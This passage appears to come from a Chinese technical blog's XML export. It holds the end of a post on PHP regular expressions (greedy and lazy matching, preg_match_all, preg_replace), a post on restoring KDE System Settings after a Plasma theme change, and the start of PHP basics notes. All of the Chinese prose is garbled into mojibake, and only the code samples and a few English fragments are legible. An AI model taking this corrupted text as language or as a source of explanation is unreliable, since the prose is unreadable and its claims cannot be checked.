<li>å°†å¯é€‰åˆ†æ”¯å±€éƒ¨åŒ–ã€‚æ¯”å¦‚ï¼Œæ¨¡å¼*cat(arcat|erpillar|)*åŒ¹é… â€catâ€ï¼Œ â€œcataractâ€ï¼Œ â€œcaterpillarâ€ ä¸­çš„ä¸€ä¸ªï¼Œå¦‚æœæ²¡æœ‰åœ†æ‹¬å·çš„è¯ï¼Œå®ƒåŒ¹é…çš„åˆ™æ˜¯ â€cataractâ€ï¼Œ â€œerpillarâ€ ä»¥åŠç©ºå­—ç¬¦ä¸²ã€‚</li>
<li>å°†å­ç»„è®¾å®šä¸ºæ•è·å­ç»„(å‘ä¸Šé¢å®šä¹‰çš„)ã€‚å½“æ•´ä¸ªæ¨¡å¼åŒ¹é…åï¼Œ ç›®æ ‡å­—ç¬¦ä¸²ä¸­åŒ¹é…å­ç»„çš„éƒ¨åˆ†å°†ä¼šé€šè¿‡ <strong>pcre_exec()()</strong> çš„ <em>ovector</em> å‚æ•°å›ä¼ ç»™è°ƒç”¨è€…ã€‚ å·¦æ‹¬å·ä»å·¦è‡³å³å‡ºç°çš„æ¬¡åºå°±æ˜¯å¯¹åº”å­ç»„çš„ä¸‹æ ‡(ä» 1 å¼€å§‹)ï¼Œ å¯ä»¥é€šè¿‡è¿™äº›ä¸‹æ ‡æ•°å­—æ¥è·å–æ•è·å­æ¨¡å¼åŒ¹é…ç»“æœã€‚</li>
</ol>
<p>ä¸ºäº†æ–¹ä¾¿ç®€å†™ï¼Œå¦‚æœéœ€è¦åœ¨éæ•è·å­ç»„å¼€å§‹ä½ç½®è®¾ç½®é€‰é¡¹ï¼Œ é€‰é¡¹å­—æ¯å¯ä»¥ä½äº ? å’Œ : ä¹‹é—´ï¼Œæ¯”å¦‚ï¼š</p>
<figure class="highlight clojure"><table><tr><td class="code"><pre><span class="line">(<span class="name">?i:saturday</span>|sunday)</span><br><span class="line">(<span class="name">?:</span>(<span class="name">?i</span>)saturday|sunday)</span><br></pre></td></tr></table></figure>

<h3 id="æ³¨é‡Š"><a href="#æ³¨é‡Š" class="headerlink" title="æ³¨é‡Š"></a>æ³¨é‡Š</h3><p>å­—ç¬¦åºåˆ—(?#æ ‡è®°å¼€å§‹ä¸€ä¸ªæ³¨é‡Šç›´åˆ°é‡åˆ°ä¸€ä¸ªå³æ‹¬å·ã€‚ä¸å…è®¸åµŒå¥—æ‹¬å·ã€‚ æ³¨é‡Šä¸­çš„å­—ç¬¦ä¸ä¼šä½œä¸ºæ¨¡å¼çš„ä¸€éƒ¨åˆ†å‚ä¸åŒ¹é…ã€‚å¦‚ï¼š<code>/te(?# comments)st/</code></p>
<h3 id="é€’å½’æ¨¡å¼"><a href="#é€’å½’æ¨¡å¼" class="headerlink" title="é€’å½’æ¨¡å¼"></a>é€’å½’æ¨¡å¼</h3><p> (?R) å¥—ä¸ªå¨ƒã€‚</p>
<h3 id="è´ªå©ªæ¨¡å¼ä¸æ‡’æƒ°æ¨¡å¼"><a href="#è´ªå©ªæ¨¡å¼ä¸æ‡’æƒ°æ¨¡å¼" class="headerlink" title="è´ªå©ªæ¨¡å¼ä¸æ‡’æƒ°æ¨¡å¼"></a>è´ªå©ªæ¨¡å¼ä¸æ‡’æƒ°æ¨¡å¼</h3><p>æ­£åˆ™è¡¨è¾¾å¼ä¸­æ¯ä¸ªå…ƒå­—ç¬¦åŒ¹é…ä¸€ä¸ªå­—ç¬¦ï¼Œå½“ä½¿ç”¨+ä¹‹åå°†ä¼šå˜çš„è´ªå©ªï¼Œå®ƒå°†åŒ¹é…å°½å¯èƒ½å¤šçš„å­—ç¬¦ï¼Œä½†ä½¿ç”¨é—®å·?å­—ç¬¦æ—¶ï¼Œå®ƒå°†å°½å¯èƒ½å°‘çš„åŒ¹é…å­—ç¬¦ï¼Œæ—¢æ˜¯æ‡’æƒ°æ¨¡å¼ã€‚</p>
<ul>
<li>è´ªå©ªæ¨¡å¼ï¼šåœ¨å¯åŒ¹é…ä¸å¯ä¸åŒ¹é…çš„æ—¶å€™ï¼Œä¼˜å…ˆåŒ¹é…<br> //ä¸‹é¢çš„\dè¡¨ç¤ºåŒ¹é…æ•°å­—</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$p = <span class="string">'/\d+\-\d+/'</span>;</span><br><span class="line">$str = <span class="string">"æˆ‘çš„ç”µè¯æ˜¯010-12345678"</span>;</span><br><span class="line">preg_match($p, $str, $match);</span><br><span class="line"><span class="keyword">echo</span> $match[<span class="number">0</span>]; <span class="comment">//ç»“æœä¸ºï¼š010-12345678</span></span><br></pre></td></tr></table></figure>

<ul>
<li>æ‡’æƒ°æ¨¡å¼ï¼šåœ¨å¯åŒ¹é…ä¸å¯ä¸åŒ¹é…çš„æ—¶å€™ï¼Œä¼˜å…ˆä¸åŒ¹é…</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$p = <span class="string">'/\d?\-\d?/'</span>;</span><br><span class="line">$str = <span class="string">"æˆ‘çš„ç”µè¯æ˜¯010-12345678"</span>;</span><br><span class="line">preg_match($p, $str, $match);</span><br><span class="line"><span class="keyword">echo</span> $match[<span class="number">0</span>]; <span class="comment">//ç»“æœä¸ºï¼š0-1</span></span><br></pre></td></tr></table></figure>

<p>å½“æˆ‘ä»¬ç¡®åˆ‡çš„çŸ¥é“æ‰€åŒ¹é…çš„å­—ç¬¦é•¿åº¦çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨{}æŒ‡å®šåŒ¹é…å­—ç¬¦æ•°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$p = <span class="string">'/\d&#123;3&#125;\-\d&#123;8&#125;/'</span>;</span><br><span class="line">$str = <span class="string">"æˆ‘çš„ç”µè¯æ˜¯010-12345678"</span>;</span><br><span class="line">preg_match($p, $str, $match);</span><br><span class="line"><span class="keyword">echo</span> $match[<span class="number">0</span>]; <span class="comment">//ç»“æœä¸ºï¼š010-12345678</span></span><br></pre></td></tr></table></figure>

<h3 id="ä½¿ç”¨æ­£åˆ™è¿›è¡ŒåŒ¹é…"><a href="#ä½¿ç”¨æ­£åˆ™è¿›è¡ŒåŒ¹é…" class="headerlink" title="ä½¿ç”¨æ­£åˆ™è¿›è¡ŒåŒ¹é…"></a>ä½¿ç”¨æ­£åˆ™è¿›è¡ŒåŒ¹é…</h3><p>preg_matchç”¨æ¥æ‰§è¡Œä¸€ä¸ªåŒ¹é…ï¼Œå¯ä»¥ç®€å•çš„ç”¨æ¥åˆ¤æ–­æ¨¡å¼æ˜¯å¦åŒ¹é…æˆåŠŸï¼Œæˆ–è€…å–å¾—ä¸€ä¸ªåŒ¹é…ç»“æœï¼Œä»–çš„è¿”å›å€¼æ˜¯åŒ¹é…æˆåŠŸçš„æ¬¡æ•°0æˆ–è€…1ï¼Œåœ¨åŒ¹é…åˆ°1æ¬¡ä»¥åå°±ä¼šåœæ­¢æœç´¢ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$subject = <span class="string">"abcdef"</span>;</span><br><span class="line">$pattern = <span class="string">'/def/'</span>;</span><br><span class="line">preg_match($pattern, $subject, $matches);</span><br><span class="line">print_r($matches); <span class="comment">//ç»“æœä¸ºï¼šArray ( [0] =&gt; def )</span></span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢çš„ä»£ç ç®€å•çš„æ‰§è¡Œäº†ä¸€ä¸ªåŒ¹é…ï¼Œç®€å•çš„åˆ¤æ–­defæ˜¯å¦èƒ½åŒ¹é…æˆåŠŸï¼Œä½†æ˜¯æ­£åˆ™è¡¨è¾¾å¼çš„å¼ºå¤§çš„åœ°æ–¹æ˜¯è¿›è¡Œæ¨¡å¼åŒ¹é…ï¼Œå› æ­¤æ›´å¤šçš„æ—¶å€™ï¼Œä¼šä½¿ç”¨æ¨¡å¼ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$subject = <span class="string">"abcdef"</span>;</span><br><span class="line">$pattern = <span class="string">'/a(.*?)d/'</span>;</span><br><span class="line">preg_match($pattern, $subject, $matches);</span><br><span class="line">print_r($matches); <span class="comment">//ç»“æœä¸ºï¼šArray ( [0] =&gt; abcd [1] =&gt; bc )</span></span><br></pre></td></tr></table></figure>

<h3 id="æŸ¥æ‰¾æ‰€æœ‰åŒ¹é…ç»“æœ"><a href="#æŸ¥æ‰¾æ‰€æœ‰åŒ¹é…ç»“æœ" class="headerlink" title="æŸ¥æ‰¾æ‰€æœ‰åŒ¹é…ç»“æœ"></a>æŸ¥æ‰¾æ‰€æœ‰åŒ¹é…ç»“æœ</h3><p>preg_matchåªèƒ½åŒ¹é…ä¸€æ¬¡ç»“æœï¼Œä½†å¾ˆå¤šæ—¶å€™æˆ‘ä»¬éœ€è¦åŒ¹é…æ‰€æœ‰çš„ç»“æœï¼Œpreg_match_allå¯ä»¥å¾ªç¯è·å–ä¸€ä¸ªåˆ—è¡¨çš„åŒ¹é…ç»“æœæ•°ç»„ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$p</span> = <span class="string">"|&lt;[^&gt;]+&gt;(.*?)&lt;/[^&gt;]+&gt;|i"</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">"&lt;b&gt;example: &lt;/b&gt;&lt;div align=left&gt;this is a test&lt;/div&gt;"</span>;</span><br><span class="line">preg_match_all(<span class="variable">$p</span>, <span class="variable">$str</span>, <span class="variable">$matches</span>);</span><br><span class="line">print_r(<span class="variable">$matches</span>);</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥ä½¿ç”¨preg_match_allåŒ¹é…ä¸€ä¸ªè¡¨æ ¼ä¸­çš„æ•°æ®ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">$p = "/<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>(.*?)<span class="tag">&lt;<span class="name">\</span>/<span class="attr">td</span>&gt;</span>\s*<span class="tag">&lt;<span class="name">td</span>&gt;</span>(.*?)<span class="tag">&lt;<span class="name">\</span>/<span class="attr">td</span>&gt;</span>\s*<span class="tag">&lt;<span class="name">\</span>/<span class="attr">tr</span>&gt;</span>/i";</span><br><span class="line">$str = "<span class="tag">&lt;<span class="name">table</span>&gt;</span> <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>Eric<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>25<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span> <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>John<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>26<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span> <span class="tag">&lt;/<span class="name">table</span>&gt;</span>";</span><br><span class="line">preg_match_all($p, $str, $matches);</span><br><span class="line">print_r($matches);</span><br></pre></td></tr></table></figure>

<p>$matchesç»“æœæ’åºä¸º$matches[0]ä¿å­˜å®Œæ•´æ¨¡å¼çš„æ‰€æœ‰åŒ¹é…, $matches[1] ä¿å­˜ç¬¬ä¸€ä¸ªå­ç»„çš„æ‰€æœ‰åŒ¹é…ï¼Œä»¥æ­¤ç±»æ¨ã€‚</p>
<h3 id="æ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢"><a href="#æ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢"></a>æ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢</h3><p>æ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢ä¸æ›¿æ¢åœ¨æŸäº›æ–¹é¢å…·æœ‰é‡è¦ç”¨é€”ï¼Œæ¯”å¦‚è°ƒæ•´ç›®æ ‡å­—ç¬¦ä¸²çš„æ ¼å¼ï¼Œæ”¹å˜ç›®æ ‡å­—ç¬¦ä¸²ä¸­åŒ¹é…å­—ç¬¦ä¸²çš„é¡ºåºç­‰ã€‚</p>
<p>ä¾‹å¦‚æˆ‘ä»¬å¯ä»¥ç®€å•çš„è°ƒæ•´å­—ç¬¦ä¸²çš„æ—¥æœŸæ ¼å¼ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$string = <span class="string">'April 15, 2014'</span>;</span><br><span class="line">$pattern = <span class="string">'/(\w+) (\d+), (\d+)/i'</span>;</span><br><span class="line">$replacement = <span class="string">'$3, $&#123;1&#125; $2'</span>;</span><br><span class="line"><span class="keyword">echo</span> preg_replace($pattern, $replacement, $string); <span class="comment">//ç»“æœä¸ºï¼š2014, April 15</span></span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­${1}ä¸$1çš„å†™æ³•æ˜¯ç­‰æ•ˆçš„ï¼Œè¡¨ç¤ºç¬¬ä¸€ä¸ªåŒ¹é…çš„å­—ä¸²ï¼Œ$2ä»£è¡¨ç¬¬äºŒä¸ªåŒ¹é…çš„ã€‚</p>
<p>é€šè¿‡å¤æ‚çš„æ¨¡å¼ï¼Œæˆ‘ä»¬å¯ä»¥æ›´åŠ ç²¾ç¡®çš„æ›¿æ¢ç›®æ ‡å­—ç¬¦ä¸²çš„å†…å®¹ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$patterns = <span class="keyword">array</span> (<span class="string">'/(19|20)(\d&#123;2&#125;)-(\d&#123;1,2&#125;)-(\d&#123;1,2&#125;)/'</span>,</span><br><span class="line">                   <span class="string">'/^\s*&#123;(\w+)&#125;\s*=/'</span>);</span><br><span class="line">$replace = <span class="keyword">array</span> (<span class="string">'\3/\4/\1\2'</span>, <span class="string">'$\1 ='</span>);<span class="comment">//\3ç­‰æ•ˆäº$3,\4ç­‰æ•ˆäº$4ï¼Œä¾æ¬¡ç±»æ¨</span></span><br><span class="line"><span class="keyword">echo</span> preg_replace($patterns, $replace, <span class="string">'&#123;startDate&#125; = 1999-5-27'</span>); <span class="comment">//ç»“æœä¸ºï¼š$startDate = 5/27/1999</span></span><br></pre></td></tr></table></figure>

<p>//è¯¦ç»†è§£é‡Šä¸‹ç»“æœï¼š(19|20)è¡¨ç¤ºå–19æˆ–è€…20ä¸­ä»»æ„ä¸€ä¸ªæ•°å­—ï¼Œ(\d{2})è¡¨ç¤ºä¸¤ä¸ªæ•°å­—ï¼Œ(\d{1,2})è¡¨ç¤º1ä¸ªæˆ–2ä¸ªæ•°å­—ï¼Œ(\d{1,2})è¡¨ç¤º1ä¸ªæˆ–2ä¸ªæ•°å­—ã€‚^\s*{(\w+)\s*=}è¡¨ç¤ºä»¥ä»»æ„ç©ºæ ¼å¼€å¤´çš„ï¼Œå¹¶ä¸”åŒ…å«åœ¨{}ä¸­çš„å­—ç¬¦ï¼Œå¹¶ä¸”ä»¥ä»»æ„ç©ºæ ¼ç»“å°¾çš„ï¼Œæœ€åæœ‰ä¸ª=å·çš„ã€‚<br>ç”¨æ­£åˆ™æ›¿æ¢æ¥å»æ‰å¤šä½™çš„ç©ºæ ¼ä¸å­—ç¬¦ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">'one     two'</span>;</span><br><span class="line"><span class="variable">$str</span> = preg_replace(<span class="string">'/\s+/'</span>, <span class="string">' '</span>, <span class="variable">$str</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$str</span>; // ç»“æœæ”¹å˜ä¸º<span class="string">'one two'</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>æ­£åˆ™</tag>
      </tags>
  </entry>
  <entry>
    <title>è§£å†³æ›´æ”¹Plasmaæ¡Œé¢åKDEç³»ç»Ÿè®¾ç½®æ— æ³•æ‰“å¼€çš„é—®é¢˜</title>
    <url>/2020/09/11/%E8%A7%A3%E5%86%B3%E6%9B%B4%E6%94%B9Plasma%E6%A1%8C%E9%9D%A2%E5%90%8EKDE%E7%B3%BB%E7%BB%9F%E8%AE%BE%E7%BD%AE%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>æ›´æ–° Manjaro Linux(KDE) çš„ Plasma ä¸»é¢˜åŒ…ä¹‹åå‘ç°ç³»ç»Ÿè®¾ç½®æ— æ³•æ‰“å¼€çš„è§£å†³æ–¹æ¡ˆã€‚</p>
<a id="more"></a>

<h1 id="é—®é¢˜æè¿°"><a href="#é—®é¢˜æè¿°" class="headerlink" title="é—®é¢˜æè¿°"></a>é—®é¢˜æè¿°</h1><p>åœ¨ Manjaro Linux ä¸‹é…ç½® KDE Plasma çš„æ—¶å€™æ›´æ¢äº†McMojave ä¸»é¢˜ã€‚æ›´æ¢ä¹‹åå‘ç°ç³»ç»Ÿè®¾ç½®æ— æ³•æ‰“å¼€ã€‚çŒœæµ‹æ˜¯ç”±äºä¸»é¢˜çš„å†²çªå¯¼è‡´çš„ï¼Œäºæ˜¯çŒœæµ‹ç”¨åˆ‡æ¢æˆé»˜è®¤ä¸»é¢˜çš„æ–¹å¼å¯ä»¥è§£å†³æ­¤é—®é¢˜ã€‚ä½†æ˜¯ä¸€èˆ¬æ›´æ¢é»˜è®¤ä¸»é¢˜çš„æ–¹å¼éƒ½æ˜¯ä»ç³»ç»Ÿè®¾ç½®å…¥æ‰‹ï¼Œæ‰¾åˆ°å¤–è§‚é€‰é¡¹å†åˆ‡æ¢ä¸»é¢˜ï¼Œç°åœ¨ç³»ç»Ÿè®¾ç½®çš„ GUI ç•Œé¢æ— æ³•æ‰“å¼€ï¼Œäºæ˜¯å°è¯•ç”¨å…¶å®ƒæ–¹æ³•æ›´æ¢æˆé»˜è®¤ä¸»é¢˜ã€‚</p>
<h1 id="å¤±è´¥çš„å°è¯•"><a href="#å¤±è´¥çš„å°è¯•" class="headerlink" title="å¤±è´¥çš„å°è¯•"></a>å¤±è´¥çš„å°è¯•</h1><h2 id="ç”¨ä¸­æ–‡æœç´¢ç›¸å…³å†…å®¹"><a href="#ç”¨ä¸­æ–‡æœç´¢ç›¸å…³å†…å®¹" class="headerlink" title="ç”¨ä¸­æ–‡æœç´¢ç›¸å…³å†…å®¹"></a>ç”¨ä¸­æ–‡æœç´¢ç›¸å…³å†…å®¹</h2><p>ä»€ä¹ˆä¹Ÿæ²¡æœ‰ã€‚ä¸­æ–‡ä½¿ç”¨åœ°åŒºå¯¹æ“ä½œç³»ç»Ÿé—®é¢˜çš„ç›¸å…³æ”¯æŒè¿˜æ˜¯å¤ªè–„å¼±äº†ï¼Œå³ä½¿æœ‰ç›¸å…³å†…å®¹ä¹Ÿä¸€èˆ¬éƒ½æ˜¯åŠå…¶è¿‡æ—¶çš„åªè¨€ç‰‡è¯­ï¼Œç›¸åè½¬è€Œå»æœç´¢è‹±æ–‡å†…å®¹çš„æ—¶å€™å‘ç°ç›¸å…³æ”¯æŒéå¸¸å¤šï¼Œè¿˜æ˜¯å·®è·æŒºå¤§çš„ã€‚ä¹Ÿç®—è·å¾—äº†ç»éªŒï¼Œä»¥åé‡åˆ°é—®é¢˜å®å¯å»å•ƒè‹±æ–‡çš„æ–‡æ¡£ä¹Ÿè¦å‡å°‘å¯¹ä¸­æ–‡çš„ä¾èµ–ã€‚</p>
<h2 id="åˆ é™¤KDEè®¾ç½®é¡¹å¹¶é‡å¯"><a href="#åˆ é™¤KDEè®¾ç½®é¡¹å¹¶é‡å¯" class="headerlink" title="åˆ é™¤KDEè®¾ç½®é¡¹å¹¶é‡å¯"></a>åˆ é™¤KDEè®¾ç½®é¡¹å¹¶é‡å¯</h2><p>æ ¹æ®ç½‘ç»œä¸Šçš„ç›¸å…³æ”¯æŒï¼Œå°† <code>~/</code> ç›®å½•ä¸‹çš„ <code>~/.kde/</code> å’Œ <code>~/.kde4/</code> ç›®å½•åˆ é™¤å¹¶é‡å¯ï¼Œé‡å¯åå‘ç° <code>~/.kde/</code> ç›®å½•è‡ªåŠ¨ç”Ÿæˆäº†ï¼Œå…¶ä¸­çš„é…ç½®æ–‡ä»¶æ˜¯æ ¹æ®å½“å‰ä¸»é¢˜çš„è®¾ç½®è‡ªåŠ¨ç”Ÿæˆçš„ã€‚é‚æ”¾å¼ƒã€‚</p>
<h2 id="é‡æ–°å®‰è£…-plasma-desktop-å’Œ-plasma-meta"><a href="#é‡æ–°å®‰è£…-plasma-desktop-å’Œ-plasma-meta" class="headerlink" title="é‡æ–°å®‰è£… plasma-desktop å’Œ plasma-meta"></a>é‡æ–°å®‰è£… plasma-desktop å’Œ plasma-meta</h2><p>é‡æ–°å®‰è£…ä¹‹åå‘ç°æ²¡æœ‰ä»»ä½•å˜åŒ–ã€‚</p>
<h1 id="æˆåŠŸçš„å°è¯•"><a href="#æˆåŠŸçš„å°è¯•" class="headerlink" title="æˆåŠŸçš„å°è¯•"></a>æˆåŠŸçš„å°è¯•</h1><h2 id="ç”¨å‘½ä»¤è¡Œæ£€æŸ¥ç³»ç»Ÿè®¾ç½®GUIç¨‹åºçš„é—®é¢˜"><a href="#ç”¨å‘½ä»¤è¡Œæ£€æŸ¥ç³»ç»Ÿè®¾ç½®GUIç¨‹åºçš„é—®é¢˜" class="headerlink" title="ç”¨å‘½ä»¤è¡Œæ£€æŸ¥ç³»ç»Ÿè®¾ç½®GUIç¨‹åºçš„é—®é¢˜"></a>ç”¨å‘½ä»¤è¡Œæ£€æŸ¥ç³»ç»Ÿè®¾ç½®GUIç¨‹åºçš„é—®é¢˜</h2><p>Konsole ä¸­é”®å…¥ <code>systemsettings5</code> ä»¥å°è¯•ä»å‘½ä»¤è¡Œå¯åŠ¨ç³»ç»Ÿè®¾ç½®ã€‚å‘ç°è¾“å‡ºé”™è¯¯ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cyclic dependency detected between <span class="string">"file:///usr/lib/qt/qml/org/kde/kirigami.2/styles/org.kde.desktop.plasma/units.qml"</span> and <span class="string">"file:///usr/lib/qt/qml/org/kde/kirigami.2/styles/org.kde.desktop.plasma/units.qml"</span></span><br><span class="line">file:///usr/share/kpackage/genericqml/org.kde.systemsettings.sidebar/contents/ui/subcategorypage.qml:141:9: qml connections: implicitly defined onfoo properties <span class="keyword">in</span> connections are deprecated. use this syntax instead: <span class="keyword">function</span> onfoo(&lt;arguments&gt;) &#123; ... &#125;</span><br><span class="line">file:///usr/share/kpackage/genericqml/org.kde.systemsettings.sidebar/contents/ui/subcategorypage.qml:131:9: qml connections: implicitly defined onfoo properties <span class="keyword">in</span> connections are deprecated. use this syntax instead: <span class="keyword">function</span> onfoo(&lt;arguments&gt;) &#123; ... &#125;</span><br><span class="line">file:///usr/lib/qt/qml/org/kde/kirigami.2/private/refreshablescrollview.qml:143:13: qml connections: implicitly defined onfoo properties <span class="keyword">in</span> connections are deprecated. use this syntax instead: <span class="keyword">function</span> onfoo(&lt;arguments&gt;) &#123; ... &#125;</span><br><span class="line">file:///usr/lib/qt/qml/org/kde/kirigami.2/private/refreshablescrollview.qml:143:13: qml connections: implicitly defined onfoo properties <span class="keyword">in</span> connections are deprecated. use this syntax instead: <span class="keyword">function</span> onfoo(&lt;arguments&gt;) &#123; ... &#125; </span><br><span class="line">cyclic dependency detected between</span><br><span class="line"><span class="string">"file:///usr/lib/qt/qml/org/kde/kirigami.2/styles/org.kde.desktop.plasma/units.qml"</span> and</span><br><span class="line"><span class="string">"file:///usr/lib/qt/qml/org/kde/kirigami.2/styles/org.kde.desktop.plasma/units.qml"</span></span><br><span class="line">qqmlengine::setcontextforobject(): object already has a qqmlcontext qt.qpa.xcb:</span><br><span class="line">qxcbconnection: xcb error: 5 (badatom), sequence: 629, resource id: 0, major code: 20 (getproperty), minor code: 0</span><br></pre></td></tr></table></figure>

<p>ä¼¼ä¹ç¡®å®šäº†é—®é¢˜æ˜¯ç”±äºæ–°é‡‡ç”¨çš„ä¸»é¢˜äº§ç”Ÿäº†å¾ªç¯ä¾èµ–ä¹‹ç±»çš„é—®é¢˜ã€‚æ¥ä¸‹æ¥è€ƒè™‘å¦‚ä½•å°†ä¸»é¢˜æ›´æ¢å›é»˜è®¤ã€‚</p>
<h2 id="ä»å‘½ä»¤è¡Œå°†ä¸»é¢˜æ›´æ¢å›-Breezeï¼ˆé»˜è®¤ä¸»é¢˜ï¼‰"><a href="#ä»å‘½ä»¤è¡Œå°†ä¸»é¢˜æ›´æ¢å›-Breezeï¼ˆé»˜è®¤ä¸»é¢˜ï¼‰" class="headerlink" title="ä»å‘½ä»¤è¡Œå°†ä¸»é¢˜æ›´æ¢å› Breezeï¼ˆé»˜è®¤ä¸»é¢˜ï¼‰"></a>ä»å‘½ä»¤è¡Œå°†ä¸»é¢˜æ›´æ¢å› Breezeï¼ˆé»˜è®¤ä¸»é¢˜ï¼‰</h2><p>ä½¿ç”¨ Konsoleï¼Œé”®å…¥ <code>systemsettings5 --style=Breeze</code>ï¼Œç»•è¿‡GUIç•Œé¢ä»å‘½ä»¤è¡Œç›´æ¥æ›´æ”¹ä¸»é¢˜ã€‚é‡å¯ã€‚ç³»ç»Ÿè®¾ç½®å¯ä»¥æ‰“å¼€ï¼Œé—®é¢˜å¾—åˆ°è§£å†³ã€‚</p>
<p>è¯¦è¯·å‚è§ï¼š<a href="https://www.reddit.com/r/kde/comments/i0m5gz/system_settings_wont_open_after_changing/" target="_blank" rel="noopener">https://www.reddit.com/r/kde/comments/i0m5gz/system_settings_wont_open_after_changing/</a></p>
<h1 id="æ„Ÿæƒ³"><a href="#æ„Ÿæƒ³" class="headerlink" title="æ„Ÿæƒ³"></a>æ„Ÿæƒ³</h1><p>ä¸­æ–‡ç¤¾åŒºçš„åŠ›é‡è¿˜æ˜¯æ¯”è¾ƒæ¸ºå°ï¼Œå­¦è‹±è¯­çœŸçš„å¾ˆé‡è¦ï¼Œè‹±æ–‡ç¤¾åŒºå•¥éƒ½æœ‰ï¼ˆ</p>
]]></content>
      <categories>
        <category>ç³»ç»Ÿ</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>KDE</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPåŸºç¡€è¡¥å®Œ</title>
    <url>/2020/06/16/PHP%E5%9F%BA%E7%A1%80%E8%A1%A5%E5%AE%8C/</url>
    <content><![CDATA[<p>PHPåŸºç¡€å¤ªè–„å¼±äº†ã€‚æœ€è¿‘å‡ å¤©åšä¸ªè¡¥å®Œï¼Œè®°ç‚¹ç¬”è®°ã€‚</p>
<a id="more"></a>

<h2 id="PHPåŸºç¡€"><a href="#PHPåŸºç¡€" class="headerlink" title="PHPåŸºç¡€"></a>PHPåŸºç¡€</h2><p>PHP è„šæœ¬å¯ä»¥æ”¾åœ¨æ–‡æ¡£ä¸­çš„ä»»ä½•ä½ç½®ï¼Œä»¥<code>&lt;?php</code>å¼€å§‹ï¼Œä»¥ <code>?&gt;</code> ç»“æŸï¼Œæ¯ä¸ªä»£ç è¡Œéƒ½å¿…é¡»ä»¥åˆ†å·ç»“æŸã€‚</p>
<p><code>//</code> æ˜¯å•è¡Œæ³¨é‡Šï¼Œ<code>/**/</code>æ˜¯å¤šè¡Œæ³¨é‡Šã€‚</p>
<h2 id="PHPå˜é‡"><a href="#PHPå˜é‡" class="headerlink" title="PHPå˜é‡"></a>PHPå˜é‡</h2><h3 id="å˜é‡å£°æ˜"><a href="#å˜é‡å£°æ˜" class="headerlink" title="å˜é‡å£°æ˜"></a>å˜é‡å£°æ˜</h3><p>å˜é‡ä»¥ $ å¼€å§‹ï¼Œå¤§å°å†™æ•æ„Ÿã€‚æ²¡æœ‰å£°æ˜å˜é‡çš„å‘½ä»¤ï¼Œåœ¨å£°æ˜å˜é‡åœ¨é¦–æ¬¡ç»™å˜é‡èµ‹å€¼çš„åŒæ—¶å®Œæˆã€‚</p>
<h3 id="ä½œç”¨åŸŸ"><a href="#ä½œç”¨åŸŸ" class="headerlink" title="ä½œç”¨åŸŸ"></a>ä½œç”¨åŸŸ</h3><p>å˜é‡çš„ä½œç”¨åŸŸæ˜¯è„šæœ¬ä¸­å˜é‡å¯è¢«å¼•ç”¨/ä½¿ç”¨çš„éƒ¨åˆ†ã€‚</p>
<p>åœ¨æ‰€æœ‰å‡½æ•°å¤–éƒ¨å®šä¹‰çš„å˜é‡ï¼Œæ‹¥æœ‰å…¨å±€ä½œç”¨åŸŸã€‚é™¤äº†å‡½æ•°å¤–ï¼Œå…¨å±€å˜é‡å¯ä»¥è¢«è„šæœ¬ä¸­çš„ä»»ä½•éƒ¨åˆ†è®¿é—®ï¼Œ<strong>è¦åœ¨ä¸€ä¸ªå‡½æ•°ä¸­è®¿é—®ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œéœ€è¦ä½¿ç”¨ global å…³é”®å­—</strong>ã€‚åœ¨ PHP å‡½æ•°å†…éƒ¨å£°æ˜çš„å˜é‡æ˜¯å±€éƒ¨å˜é‡ï¼Œä»…èƒ½åœ¨å‡½æ•°å†…éƒ¨è®¿é—®ã€‚</p>
<p><strong>PHPä¸­å‡½æ•°çš„èŠ±æ‹¬å·æ„æˆæ–°çš„ä½œç”¨åŸŸã€‚</strong>ifå’Œforçš„èŠ±æ‹¬å·å¹¶ä¸æ„æˆæ–°çš„ä½œç”¨åŸŸã€‚</p>
